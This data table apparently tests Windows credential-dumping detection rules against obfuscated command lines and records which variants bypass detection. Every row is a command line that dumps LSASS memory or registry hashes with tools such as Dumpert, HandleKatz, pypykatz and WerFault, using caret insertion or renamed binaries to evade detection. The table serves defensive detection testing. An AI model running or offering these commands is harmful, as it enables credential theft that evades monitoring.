Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1003.001	proc_creation_win_hktl_dumpert	HackTool - Dumpert Process Dumper Execution	2704ab9e-afe2-4854-a3b1-0c0706d03578		rundll32.exe C:\Temp\custom_dump.dll,Dump	TRUE	TRUE	TRUE	
t1003.001	proc_creation_win_hktl_handlekatz	HackTool - HandleKatz LSASS Dumper Execution	ca621ba5-54ab-4035-9942-d378e6fcde3c		"cmd.exe /c ""C:\temp\sys_tool.exe --p^id: 700 --outf^ile: C:\temp\output.bin"""	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_hktl_inveigh	HackTool - Inveigh Execution	b99a1518-1ad5-4f65-bc95-1ffff97a8fd0		"cmd.exe /c ""C:\Temp\sys_update.exe -S^pooferIP 10.0.0.2 -S^nifferIP 10.0.0.2"""	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_lolbin_susp_sqldumper_activity	Dumping Process via Sqldumper.exe	23ceaf5c-b6f1-4a32-8559-f2ff734be516		"cmd.exe /c ""sqldumper.exe 700 0 0^x0110"""	FALSE	FALSE	FALSE	
t1003.001	proc_creation_win_werfault_lsass_shtinkering	Potential Credential Dumping Via WER	9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3		"C:\Windows\system32\Werfault.exe ""-u"" ""-p"" 744 ""-ip"" 1112 ""-s"" 244"	TRUE	TRUE	TRUE	
t1003.001	proc_creation_win_werfault_lsass_shtinkering	Potential Credential Dumping Via WER	9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3		C:\Windows\system32\Werfault.exe -u  -p 744 -ip 1112 -s 244	TRUE	TRUE	TRUE	
t1003.001	proc_creation_win_werfault_lsass_shtinkering	Potential Credential Dumping Via WER	9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3		C:\Windows\system32\Werfault.exe -u -p 744 -ip 1112 -s 244	TRUE	TRUE	TRUE	
t1003.002	proc_creation_win_hktl_pypykatz	HackTool - Pypykatz Credentials Dumping Activity	a29808fd-ef50-49ff-9c7a-59a9b040b404		"cmd.exe /c ""pypykatz l^ive reg^istry"""	FALSE	FALSE	FALSE	
t1003.002	proc_creation_win_hktl_pypykatz	HackTool - Pypykatz Credentials Dumping Activity	a29808fd-ef50-49ff-9c7a-59a9b040b404		copy C:\Python39\python.exe C:\temp\sys_runner.exe && C:\temp\sys_runner.exe -m pypykatz live registry	TRUE	TRUE	TRUE	
t1003.002	proc_creation_win_hktl_quarks_pwdump	HackTool - Quarks PwDump Execution	0685b176-c816-4837-8e7b-1216f346636b		"cmd.exe /c ""C:\temp\sys_update.exe --dump-ha^sh-local"""	FALSE	FALSE	FALSE	
